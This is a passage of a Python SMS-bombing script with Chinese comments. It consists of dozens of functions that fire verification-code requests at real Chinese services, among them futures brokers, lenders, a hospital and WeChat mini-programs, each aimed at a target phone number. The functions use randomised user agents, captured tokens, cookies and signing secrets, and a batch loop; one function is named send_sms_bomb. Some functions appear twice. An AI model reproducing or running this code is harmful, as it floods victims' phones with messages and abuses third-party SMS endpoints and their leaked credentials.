        # 4. 构造完整GET请求URL（拼接所有参数）
        request_url = (
            f"{BASE_URL}{API_PATH}?"
            f"receiver={receiver}"
            f"&sign={sign}"
            f"&encrypt_m_type=1"
        )

        # 5. 发送请求并判断结果
        response = requests.get(
            url=request_url,
            headers=REQUEST_HEADERS,
            verify=False,  # 适配Termux环境SSL验证
            timeout=15
        )
        # 按原脚本逻辑判断：状态码200且含成功标识即为有效
        return
    except Exception:
        return False

# ------------------- 恒泰期货RSA加密短信请求模块（简化版） -------------------
def hengtai_futures_send_sms(phone):
    """恒泰期货接口：RSA加密+请求发送即视为成功，无需响应判断"""
    try:
        # 1. 接口与加密核心配置（复用原脚本固定参数）
        API_URL = "https://multiapp.hsqh.net:4443/user/service/key/qrcodeService/sendVerificationCode"
        RSA_PUBLIC_KEY_BASE64 = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwVwJ12WGdZBJApmMgj0hNQWQzbHDuEoHHYJIavS1raCbIOgXAxBAyzRjasrkXefDY0qL2pwFKaijhOMY46c357BEd+tr6OuixZHw/GNms4Aytd4AQFhOoZw3LOO58GPq5SaAYZ16bHaCtmVHEf9eQUkAA5QMnd2+ZuykkGnE0mMS6asGJ3D0sedh0Q2fu64ekJqlfa/4BBKbljxzgNH4KbG6TcrTxSu56iGTUiQK/F76E4BnPtejdtDPbClf2qrXyY+YidMtliRnorrK1k7f3PYiU16124eist70D5QcIxCS983apg5wquoAz2OW6+C4xSHLADEUka+SpmLL9NgE/QIDAQAB"
        FIXED_PAYLOAD = {'secretKey': "1", 'scene': "1"}
        REQUEST_HEADERS = {
            'Host': "multiapp.hsqh.net:4443",
            'User-Agent': "Mozilla/5.0 (Linux; Android 15; OPD2404 Build/UKQ1.231108.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.58 Safari/537.36",
            'Connection': "Keep-Alive",
            'Accept-Encoding': "gzip",
            'Authorization': "",
            'user-telephone': "",
            'user-app-version': "2.0.0",
            'user-device-type': "android",
            'bundle_id': "com.hsqh.futures",
            'net_status': "",
            'device_system_type': "android",
            'user-device-id': "0ecf842c01f6c1bb",
            'longitude': "",
            'latitude': "",
            'Cookie': "acw_tc=ac11000117617655436177508e55c1901aa3922c818c4701b4d3a5a3f3e5ea"
        }

        # 2. RSA加密（保留原逻辑，确保参数生成正常）
        pem_public_key = f"-----BEGIN PUBLIC KEY-----\n{RSA_PUBLIC_KEY_BASE64}\n-----END PUBLIC KEY-----"
        rsa_key = RSA.importKey(pem_public_key)
        cipher = PKCS1_v1_5.new(rsa_key)
        encrypted_bytes = cipher.encrypt(phone.encode('utf-8'))
        encrypted_phone = base64.b64encode(encrypted_bytes).decode('utf-8')

        # 3. 构造请求体并发送
        payload = {**FIXED_PAYLOAD, 'phone': encrypted_phone}
        requests.post(
            url=API_URL,
            data=payload,
            headers=REQUEST_HEADERS,
            verify=False,
            timeout=15
        )

        # 4. 简化结果判断：只要请求发送（无异常抛出）即返回成功
        return True
    except Exception:
        # 仅当请求抛出异常（如网络错误）时返回失败
        return False
# ------------------- 光大期货RSA加密短信模块（批量简化版） -------------------
def guangda_futures_send_sms(phone):
    """光大期货接口：RSA/ECB/PKCS1Padding加密+请求发送即视为成功（单手机号适配批量调用）"""
    try:
        # 1. 接口与加密核心配置（100%复用你提供的日志/抓包参数）
        API_URL = "https://ftoem.10jqka.com.cn:9443/futgwapi/api/oem/v1/thirdPartySms/send"
        QS_ID = "541"  # 固定参数（复用日志值）
        REQUEST_HEADERS = {
            'Host': "ftoem.10jqka.com.cn:9443",
            'User-Agent': "GGuangDa_Futures/ (Royal Flush) hxtheme/0 innerversion/GDFG037.08.301.10.32 logintype/0 hidenexamine/1 userid/ appid/NVvQutmtzotTbHUp",
            'Accept-Encoding': "gzip"
        }
        RSA_PUBLIC_KEY_BASE64 = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC6s72YtZTNHvsf2rtS12SX3PcxFamWYqw0XYl4+w/kJ5v/IgZQ82+yQ/+NyQGWP28nIxCkznKQA/OI4ET9zp4nGq4lN5wcfpvkHyYu4Neo3seuIHsYb2xHDt5RHXTfXBE6hRtW8JxMTkqOI3CP9AQr4vUj66amz02k9gsulw6X/wIDAQAB"

        # 2. RSA加密（完全复用你提供的批量加密逻辑，确保结果一致）
        def rsa_encrypt_inner(plain_text):
            public_key_bytes = base64.b64decode(RSA_PUBLIC_KEY_BASE64)
            rsa_public_key = RSA.importKey(public_key_bytes)
            cipher = PKCS1_v1_5.new(rsa_public_key)
            cipher_text_bytes = cipher.encrypt(plain_text.encode("utf-8"))
            return base64.b64encode(cipher_text_bytes).decode("utf-8")

        # 3. 构造form-data请求体并发送（适配单手机号调用，支持批量循环）
        encrypt_mobile = rsa_encrypt_inner(phone)
        payload = {
            "encryptMobile": encrypt_mobile,
            "qsId": QS_ID
        }
        requests.post(
            url=API_URL,
            data=payload,  # 复用你设置的form-data格式
            headers=REQUEST_HEADERS,
            verify=False,  # 适配SSL验证问题
            timeout=15
        )

        # 4. 简化结果判断：请求发送（无异常）即返回成功（适配批量调用的布尔值判断）
        return True
    except Exception:
        # 仅网络错误、超时、加密异常等返回失败
        return False

# ------------------- 批量调用适配函数（可选：整合多手机号批量触发） -------------------
def guangda_futures_send_sms_batch(phone_numbers: list) -> list:
    """光大期货批量发送入口（适配你原有的批量逻辑，返回成功/失败状态）"""
    batch_results = []
    for phone in phone_numbers:
        # 调用单手机号模块，请求即成功返回True，异常返回False
        is_success = guangda_futures_send_sms(phone)
        batch_results.append({
            "phone": phone,
            "is_success": is_success
        })
    return batch_results
    

# ------------------ 各平台发送函数 ------------------
def send_ccsgagzc(mobile):
    url = f"https://api.ccsgagzc.com/egz-client/ums/login/code/login?mobile={mobile}"
    headers = {
        'User-Agent': random_user_agent(),
        'X-Access-Token': "[object Null]",
        'content-type': "application/json",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wx9b3755ee48c7ab38/39/page-frame.html"
    }
    return make_request(url, "GET", headers=headers)

def send_bimart(mobile):
    url = "https://ec.bimart.cn/mp/ecbc/message/sms/vcode/sendForUnautherizedUser"
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'Authorization': "Bearer",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wx53ec56ae77722d79/100/page-frame.html"
    }
    payload = {"businessTag": "1001", "toPhone": mobile}
    return make_request(url, "POST", data=json.dumps(payload), headers=headers)

def send_hyrenli(mobile):
    url = f"https://hyrenli.cn/api/getSmsCode?type=0&phone={mobile}"
    headers = {
        'User-Agent': random_user_agent(),
        'x-token': "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ0bXBfNzgxOCIsImV4cCI6MTc1MjQyNzgwMCwiaWF0IjoxNzUyMzQxNDAwfQ.rNumGAw94aa65prjONZK21HBnUhEIKg_2wqc-b96vU_6veu77xG0nxb-1CtppcPRvVUUdXXnK8aLieYq7OjPNg",
        'content-type': "application/json",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wx86cf8b071e906ec2/46/page-frame.html"
    }
    return make_request(url, "GET", headers=headers)

def send_snca(mobile):
    url = "https://dynamicxa.snca.com.cn/dynamic/API/resource/rest/v2/applet/phoneCode"
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'charset': "utf-8",
        'referer': "https://servicewechat.com/wx9aa37be5f5c5edee/1/page-frame.html"
    }
    payload = {
        "userName": "yang003",
        "appKey": "31363133393737393338333831393737",
        "nonce": "yMAVf8AqdvB4ig5jaJjFWM6aCTNv8aeR",
        "createTime": "20250713002600",
        "passwdDigest": "9bab8d1a7a30bd57500194e010807ef3d530abdff4e93bec36188f12b632fd8b",
        "parameter": {"mobilephone": mobile}
    }
    return make_request(url, "POST", data=json.dumps(payload), headers=headers)

def send_hongjinzhi(mobile):
    url = "https://s.hongjinzhi.com/GetLoginCode"
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wxfcd0348934e6f727/238/page-frame.html"
    }
    payload = {"mobile": mobile, "user_id": 0, "shop_id": 0}
    return make_request(url, "POST", data=json.dumps(payload), headers=headers)

def send_zsbl(mobile):
    url = "https://zsbl.mini.jushansz.com/account/sendSmsCode"
    headers = {
        'User-Agent': random_user_agent(),
        'Accept': "application/json,text/plain,*/*",
        'token': "",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wx023add478b8af474/8/page-frame.html",
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = f"mobile={mobile}"
    return make_request(url, "POST", data=data, headers=headers)

def send_sms_bomb(mobile):
    url = "https://susudzq.msksoft.cn//api/sms/send"
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'token': "",
        'charset': "utf-8",
        'referer': "https://servicewechat.com/wx75b5b1989a4763ae/1/page-frame.html"
    }
    payload = {"mobile": mobile, "event": "mobilelogin"}
    
    try:
        response = requests.post(
            url, 
            data=json.dumps(payload), 
            headers=headers,
            timeout=5
        )
        return response.status_code, response.text
    except Exception as e:
        return None, str(e)

def send_linlongyun(mobile):
    """新增的短信接口函数"""
    url = f"https://lcy-m.linlongyun.com/sms/getVerifyCode?mobile={mobile}"
    headers = {
        'User-Agent': random_user_agent(),
        'X-Requested-With': "XMLHttpRequest",
        'content-type': "application/x-www-form-urlencoded;charset=UTF-8",
        'Authorization': "",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wx0c6afe8721098374/23/page-frame.html"
    }
    return make_request(url, "GET", headers=headers)

# ------------------ 新增的短信接口函数 ------------------
def send_shibao(mobile):
    """世宝平台短信接口"""
    url = "https://shibao.seebon.com/shibao-api/api/shibaoWachatService/sendVerifyCode"
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'phoneInfo': "{\"brand\":\"OnePlus\",\"model\":\"PJE110\",\"weChatVersion\":\"8.0.61\",\"phoneSystem\":\"Android 15\",\"appPlatform\":\"android\",\"phone\":\"\",\"loginUuid\":\"\"}",
        'appVersion': "v4.5.3",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wx0cdbfff93f01e050/76/page-frame.html",
        'Cookie': "acw_tc=ac11000117525242979884096e006574a7ceb5f50057605fd83ef54e4ac4b5"
    }
    payload = {"telephone": mobile}
    return make_request(url, "POST", data=json.dumps(payload), headers=headers)

def send_olo(mobile):
    """OLO平台短信接口"""
    url = "https://idesigner.olo-home.com/OLOShopper/miniprogram/requestThirdPartyInterface"
    headers = {
        'User-Agent': random_user_agent(),
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wx30f3c32b31665c19/15/page-frame.html"
    }
    payload = {
        'requestUrl': "http://crmmobile1.olo-home.com:8094/ElectronicSignatures/RegisterOrLoginController/getMessageCode",
        'bodyParam': json.dumps({"contacttel": mobile}),
        'contentType': "application/json",
        'method': "POST",
        'needSSL': "false"
    }
    return make_request(url, "POST", data=payload, headers=headers)

def send_isignet(mobile):
    """ISIGNET平台短信接口"""
    url = "https://asms-m.isignet.cn:7676/ASMSServer/user/sendVerifyCode"
    headers = {
        'Host': "asms-m.isignet.cn:7676",
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wxc15545eddbffa68f/23/page-frame.html"
    }
    payload = {"mobile": mobile, "version": "1.0"}
    return make_request(url, "POST", data=json.dumps(payload), headers=headers)

# 新增第一个盛事民商接口（无请求体，mobile在URL参数）
def send_shengshiminshang1(mobile):
    """盛事民商平台短信接口1（URL参数传mobile）"""
    url = f"https://zs.shengshiminshang.com/api/SysLogin/sendDxYzm?mobile={mobile}"
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Length': "0",
        'content-type': "application/json",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wxd17f17a97f3da8d4/68/page-frame.html"
    }
    return requests.post(url, headers=headers).text

# 新增第二个盛事民商接口（有JSON请求体）
def send_shengshiminshang2(mobile):
    """盛事民商平台短信接口2（JSON请求体传mobile）"""
    url = "https://zs.shengshiminshang.com/api/SysLogin/sendDxYzm"
    payload = {
        "mobile": mobile,
        "pwd": "",
        "yzm": "",
        "username": "",
        "yqrmobile": ""
    }
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wxd17f17a97f3da8d4/68/page-frame.html"
    }
    return requests.post(url, data=json.dumps(payload), headers=headers).text

# 新增车易贷平台接口
def send_chailease(mobile):
    """车易贷平台验证码查询接口"""
    url = f"https://er2lche-xcx.chailease.com.cn/wechat/personalInformation/queryVerifyCodeServlet?phone={mobile}&newPhone={mobile}"
    headers = {
        'User-Agent': random_user_agent(),
        'content-type': "application/json",
        'Authorization': "Wmeimob_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMzA2MTU2MyIsImV4cCI6MTc1MzQ5NTgwNSwiaWF0IjoxNzUyODkxMDA1LCJqdGkiOiIwYjA3NmFhMmMxMDU0MzRlOTNlZDlmYjc3NzQzMThmZCJ9.RwOATh0bTbrigiAS9zR74DJSBEo-mY3FiiaNhOr_Q0k",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wx0168f61f5dd91537/21/page-frame.html",
        'Cookie': "JSESSIONID=iNmkS9P97hOOJG6GVkwkLD5VjEHmy0YruHqIqIIZ"
    }
    return requests.get(url, headers=headers).text

# 新增安集乐租赁平台短信接口
def send_anji_leasing(mobile):
    """安集乐租赁平台短信验证码接口"""
    url = "https://saturn.anji-leasing.cn/api/pie/v1/sms/captcha"
    payload = {
        "mobile": mobile
    }
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wxfbd911046adb41ed/29/page-frame.html"
    }
    return requests.post(url, data=json.dumps(payload), headers=headers).text
def send_zhongdawulian(mobile):
     """众大物联平台短信验证码接口"""
     url = f"https://freight.zhongdawulian.com/DigitalFreightDriver/user/vcode?phone={mobile}"
     headers = {
         'User-Agent': random_user_agent(),
         'X-Access-Platform': "DRIVER_APP",
         'X-Access-DeviceType': "MP-WEIXIN",
         'X-Access-Token': "",
         'content-type': "application/json",
         'charset': "utf-8",
         'Referer': "https://servicewechat.com/wx028ba7c14713cf69/36/page-frame.html"
     }
     return requests.get(url, headers=headers).text    
# 新增：互盈医院（InterHos）短信接口
def send_interhos(mobile):
    """互盈医院平台短信验证码接口"""
    url = "https://interhos.hyhospital.com/ihosp/sms/verify-code/send"
    payload = {
        "mobile": mobile,
        "thdAppId": "wx2fb191c99cd5a010",
        "mobileEncFlag": 0,
        "orgCode": "993972",
        "appKey": "1709799938058562",
        "busType": "QLC",
        "terminalType": "WX_MP"
    }
    headers = {
        'User-Agent': random_user_agent(),
        'Content-Type': "application/json",
        'User-Token': "180c4fc3-d737-4b46-ab26-c651da7ac48c",
        'Authorization-Token': "180c4fc3-d737-4b46-ab26-c651da7ac48c",
        'charset': "utf-8",
        'Referer': "https://servicewechat.com/wx2fb191c99cd5a010/108/page-frame.html"
    }
    return requests.post(url, data=json.dumps(payload), headers=headers).text
def send_firebook(mobile):
    """FireBook 平台短信验证码接口"""
    url = f"https://firebook.tech/pro/user/sendLoginSMSV2?mobile={mobile}"
    headers = {
        'User-Agent': "okhttp/4.12.0",
        'Accept-Encoding': "gzip",
        'authorization': "Bearer",
        'wifiip': "192.168.3.15",
        'mobileip': "192.168.3.15",
        'deviceid': "android_ce3a0a0860e9b335"
    }
    return requests.get(url, headers=headers).text
def send_aiflowers(mobile):
    """AIFlowers 平台短信验证码接口"""
    url = "https://aiflowers.cn/v1/account/login"
    payload = {"phone": mobile, "pCode": ""}
    headers = {
        'User-Agent': "Dart/3.6 (dart:io)",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json",
        'oaid': "0ABA05F9CFE542D59C4178618A3ED1041c0bb8f429c12d6a975984e37cb0ff45",
        'appversion': "1.1.5.3",
        'channel': "oppo",
        'authorization': "",
        'clienttype': "android",
        'localelanguage': "zh"
    }
    return requests.post(url, data=json.dumps(payload), headers=headers).text
def send_scbjz(mobile):
    """SCBJZ 平台短信验证码接口"""
    url = "https://api.scbjz.com/v1/auth_code"
    payload = {'mobile': mobile}
    headers = {
        'User-Agent': "okhttp/3.12.0",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'app-key': "285B7957F858BF418BF87447A37A1827",
        'app-version-name': "1.97",
        'system-version': "15",
        'device-model': "OPD2404",
        'device-id': "",
        'sign': "0825fdb58fc56f12fc018197163a96f4"
    }
    return requests.post(url, data=payload, headers=headers).text
def send_yxh_hnhui(mobile):
    """YXH-HNHUI 平台短信验证码接口"""
    url = "https://yxh-api.hnhui.cn/v/yly/v1/?ctl=user&mtd=mtd_sendSmsCode"
    payload = {"data": {"mobile": mobile}}
    headers = {
        'User-Agent': random_user_agent(),
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json;charset=UTF-8"
    }
    return requests.post(url, data=json.dumps(payload), headers=headers).text
def send_yunqidai(mobile):
    """云期贷平台短信验证码接口"""
    url = "https://ywp3ruvu.yunqidai.net/index.php?c=jwtbase&m=newSendMsg"
    payload = {'phone': mobile}
    headers = {
        'User-Agent': random_user_agent(),
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'APPID': "4253",
        'SYSTEMMODEL': "android",
        'version': "jkqboppo202509081354",
        'Cookie': "poscms_ci_session=ong3aoosepr93s7099o87cas3njmnno2; SITE_TOTAL_ID=3fa352bb007d3ae234c433e9eb510631"
    }
    return requests.post(url, data=payload, headers=headers).text    
def send_apifox_yunqidai(mobile):
    """APIFOX-YUNQIDAI 平台短信验证码接口"""
    url = "https://apifox.yunqidai.net/index.php?c=jwtbase&m=newSendMsg"
    payload = {'phone': mobile}
    headers = {
        'User-Agent': random_user_agent(),
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'APPID': "4258",
        'SYSTEMMODEL': "android",
        'version': "msjmhoppo202509051217",
        'Cookie': "poscms_ci_session=prl94i9dkcl4hs4crc32uphh6oe40tfv; SITE_TOTAL_ID=064b0f1d597bcdf22602a1307e466505"
    }
    return requests.post(url, data=payload, headers=headers).text

def send_donggudi(mobile):
    """Donggudi 平台短信验证码接口（含动态 sign/dxww）"""
    # --- 固定配置（100%复用抓包） ---
    secret = "dshkncvxwq34lsdh3"
    fixed = {
        "codetype": "login",
        "apiversion": "8.9",
        "backgroundcolor": "white",
        "use_self_dns": "0",
        "device_id": "shanzhaieb51f6f8-e895-470b-9b69-d4dccb8c0538",
        "oaid": "",
        "vaid": "",
        "appid": "dgd87548"
    }
    headers = {
        'User-Agent': "DgdApp:1.1.7.117 | android:15 | OnePlus:OPD2404 | sc:808,1127 | did:shanzhaieb51f6f8-e895-470b-9b69-d4dccb8c0538 | oaid: | vaid: | did:shanzhaieb51f6f8-e895-470b-9b69-d4dccb8c0538 | idfa: | qd:oppo | av:8.9 | uid: | uuid:486179649335373568682",
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'X-Requested-With': "XMLHttpRequest",
        'Cookie': "web_uinfo=%7B%22uactime%22%3A1764292409%7D; vistor_uuid=7351109079713347872462; app_ua=DgdApp%3A1.1.7.117%20%7C%20android%3A15%20%7C%20OnePlus%3AOPD2404%20%7C%20sc%3A808%2C1127%20%7C%20did%3Ashanzhaieb51f6f8-e895-470b-9b69-d4dccb8c0538%20%7C%20oaid%3A%20%7C%20vaid%3A%20%7C%20did%3Ashanzhaieb51f6f8-e895-470b-9b69-d4dccb8c0538%20%7C%20idfa%3A%20%7C%20qd%3Aoppo%20%7C%20av%3A8.9%20%7C%20uid%3A%20%7C%20uuid%3A486179649335373568682; rand_key=a3771416530fd673ff59c0df86be906e"
    }

    # --- 生成动态参数 ---
    dxww = f"{time.strftime('%Y%m%d%H')}_{''.join(random.choices(string.ascii_letters + string.digits, k=8))}"
    sign_str = (
        f"apiversion={fixed['apiversion']}"
        f"appid={fixed['appid']}"
        f"backgroundcolor={fixed['backgroundcolor']}"
        f"codetype={fixed['codetype']}"
        f"device_id={fixed['device_id']}"
        f"dxww={dxww}"
        f"mobile={mobile}"
        f"oaid={fixed['oaid']}"
        f"use_self_dns={fixed['use_self_dns']}"
        f"vaid={fixed['vaid']}"
        f"{secret}"
    )
    sign = hashlib.md5(sign_str.encode()).hexdigest()

    payload = {**fixed, "mobile": mobile, "dxww": dxww, "sign": sign}
    return requests.post("https://api.donggudi.net/sso/sendcode", data=payload, headers=headers, timeout=10).text
def send_yingmi_sms(mobile):
    """YINGMI 平台短信验证码接口"""
    url = "https://luna-tamp.yingmi.cn/api/v1/yingmi/auth/app/phone/smsCode"
    payload = {"phone": RSA.importKey(base64.b64decode("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAys3S/o8RFFLoO/XjYhRy/X+vRAJd7jaFN4dKpR1E/1fN82tMqoCyyuAASMdp0/9YQcpktnCr1Lllx5ZvQ2wimjBH5igQwDsJHgwObipFKu3TslX+SyoXxtIIw9VFCjcc/eCSYVJBj4m7IUYL/RkzsoZFnd4w06zoY6vssR2Bb10ZazPLB8A3l/cA9B6fgTTnTdnXBrNdTQLG1CbpXNe+KmIyC3GDjbA8QbL+3K0aOhXfd0219N15oxgAq8qXHzO2gGdgzyYupaKQL+5JPY1qb6o98+9dUSIoaa51WHHUoJKUrdXt3HEJRKgtOiJWmFIPE9ddcimMMlUZgUs61iFvjQIDAQAB")).encrypt(mobile.encode(), None)[0]}
    headers = {
        'User-Agent': random_user_agent(),
        'Connection': "Keep-Alive",
        'Accept-Encoding': "gzip",
        'Content-Type': "application/json; charset=UTF-8",
        'x-aid': "",
        'x-request-id': "aster.1129875E361133E153E6",
        'x-sign': "17642933388081C204631CA4424AB4C3FAD0D7EB5AA9A",
        'sensors-anonymous-id': "82a1d3a5894c0a87",
        'Cookie': "acw_tc=ac11000117642932944877045e956d4e9463ddd5e610d5fe47eed3625bd4eb;path=/;HttpOnly;Max-Age=1800"
    }
    return requests.post(url, json=payload, headers=headers).text

def send_qhwftpa_sms(mobile):
    """QHWFTPA 平台短信验证码接口（微信小程序）"""
    url = "https://www.qhwftpa.com.cn/api//wx/xcx/api/sendVerificationCode"
    headers = {
        "Host": "www.qhwftpa.com.cn",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wxad4fdb336b235aa1/27/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = {
        "openid": "oXk2J5dSayE3FJI3x_RJHFqV_KYo",
        "unionid": "oy_E669s7VSjJdy1GTPu-fCuASnw",
        "phoneNum": mobile,
        "headImgUrl": None,
        "isPlateUser": 0,
        "userCode": None,
        "userName": None,
        "email": None,
        "createTime": [2025, 11, 27, 3, 49, 47],
        "updateTime": None,
        "remark": None,
        "sessionKey": "WiE1cVPUl816XjBFZjsy4g==",
        "verificationCode": None
    }
    return requests.post(url, headers=headers, json=data).text

# ==================== 新增 7 个平台函数（含重复接口合并） ====================
def send_baoer_sms(mobile):
    """BAOER 平台短信验证码接口（微信小程序）"""
    url = f"https://baoerapi.xiaobao108.com/api/common/sendSmsCode?scene=BIND&mobile={mobile}"
    cookies = {
        "JSD-UUID": "ZDJhODY4MzEtZjEwYS00ZTdhLThjNGEtZjE0M2NmNTBhNzlm",
    }
    headers = {
        "Host": "baoerapi.xiaobao108.com",
        "Connection": "keep-alive",
        "xtype": "jsd-weapp",
        "content-type": "application/x-www-form-urlencoded",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wxa42450640115294c/28/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    return requests.get(url, headers=headers, cookies=cookies).text

def send_fcagroupafc_sms(mobile):
    """FCA GROUP AFC 平台短信验证码接口（微信小程序，重复接口合并）"""
    url = f"https://eservice.fcagroupafc.com/wechat_ocr/login/sendVcode?phoneNum={mobile}"
    headers = {
        "Host": "eservice.fcagroupafc.com",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx4d827b89f95feb02/29/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    return requests.get(url, headers=headers).text

def send_shishier_sms(mobile):
    """SHISHIER 平台短信验证码接口（微信小程序）"""
    url = "https://shishier.xyz/api/wxlogin/sms/send"
    headers = {
        "Host": "shishier.xyz",
        "Connection": "keep-alive",
        "Authorization": "",
        "X-Device-Id": "dev_1767306481600_dj6efaa5",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx5ff18f5b9adf5a39/46/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = {"phone": mobile}
    return requests.post(url, headers=headers, json=data).text

def send_taxll_sms(mobile):
    """TAXLL 平台短信验证码接口（微信小程序）"""
    url = f"https://gw.taxll.com/api/wx/auth/send/verCode?mobileNo={mobile}"
    headers = {
        "Host": "gw.taxll.com",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Access-Org": "3000032001",
        "Access-Type": "OUTSOURCE",
        "X-Client-Info": "{\"platform\":\"wxapp\",\"version\":\"1.0.0\"}",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx71d0fb98d60e9316/8/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    return requests.get(url, headers=headers).text

def send_lesso_sms(mobile):
    """LESSO 平台短信验证码接口（微信小程序）"""  # 生成当前时间戳（毫秒级）
    url = f"https://gateway-gdd.lesso.com/gdd-server-web/jz/auth/phoneCode?userType=2&phone={mobile}&ts={1767380170748}"
    headers = {
        "Host": "gateway-gdd.lesso.com",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx92f2463c0b9392b7/16/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    return requests.get(url, headers=headers).text

def send_youjiayun_sms(mobile):
    """YOUJIAYUN 平台短信验证码接口（微信小程序）"""
    url = "https://applet-bxzn.youjiayun.com/applet/verifyCode/login"
    headers = {
        "Host": "applet-bxzn.youjiayun.com",
        "Connection": "keep-alive",
        "twitter": "7",
        "appid": "wx91dcdb3cd79fc49a",
        "content-type": "application/json",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wx91dcdb3cd79fc49a/15/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = {"phone": mobile}
    return requests.post(url, headers=headers, json=data).text

def send_senqiang_sms(mobile):
    """SENQIANG 平台短信验证码接口（微信小程序）"""
    url = "https://api.senqiang.cn/channelCredit/sendCode"
    headers = {
        "Host": "api.senqiang.cn",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Authorization": "",
        "token": "",
        "X-JCR-DEVICE-ID": "1767309698793-6742",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wxf73b40f8622e3e36/88/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = {"phone": mobile}
    return requests.post(url, headers=headers, json=data).text

def send_cqsme_sms(mobile):
    """CQSME 平台短信验证码接口（微信小程序）"""
    # 手机号替换为f-string变量，拼接至URL参数中
    url = f"https://yqm.cqsme.cn:442/cqsme/ma/user/getCaptcha?mobile={mobile}"
    headers = {
        'Host': "yqm.cqsme.cn:442",
        'User-Agent': random_user_agent(),
        'Accept': "application/json, text/plain, */*",
        'authorization': "Bearer d5f0c9ec-a374-4d40-9688-12a90df97e3b",
        'pigx-enterprise': "",
        'content-type': "application/json",
        'charset': "utf-8",
        'referer': "https://servicewechat.com/wx7697919671002902/249/page-frame.html",
        'Cookie': "pigx-enterprise=; pigx-access_token=d5f0c9ec-a374-4d40-9688-12a90df97e3b"
    }
    # 原接口为GET请求，无请求体
    return requests.get(url, headers=headers).text
def send_senqiang_sms(mobile):
    """SENQIANG 平台短信验证码接口（微信小程序）"""
    url = "https://api.senqiang.cn/channelCredit/sendCode"
    headers = {
        "Host": "api.senqiang.cn",
        "Connection": "keep-alive",
        "content-type": "application/json",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Authorization": "",
        "token": "",
        "X-JCR-DEVICE-ID": "1767309698793-6742",
        "charset": "utf-8",
        "Referer": "https://servicewechat.com/wxf73b40f8622e3e36/88/page-frame.html",
        "User-Agent": random_user_agent(),
        "Accept-Encoding": "gzip, deflate, br"
    }
    data = {"phone": mobile}
    return requests.post(url, headers=headers, json=data).text

def send_cqsme_sms(mobile):
    """CQSME 平台短信验证码接口（微信小程序）"""
    url = f"https://yqm.cqsme.cn:442/cqsme/ma/user/getCaptcha?mobile={mobile}"
    headers = {
        'Host': "yqm.cqsme.cn:442",
        'User-Agent': random_user_agent(),
        'Accept': "application/json, text/plain, */*",
        'authorization': "Bearer d5f0c9ec-a374-4d40-9688-12a90df97e3b",
        'pigx-enterprise': "",
        'content-type': "application/json",
        'charset': "utf-8",
        'referer': "https://servicewechat.com/wx7697919671002902/249/page-frame.html",
        'Cookie': "pigx-enterprise=; pigx-access_token=d5f0c9ec-a374-4d40-9688-12a90df97e3b"
    }
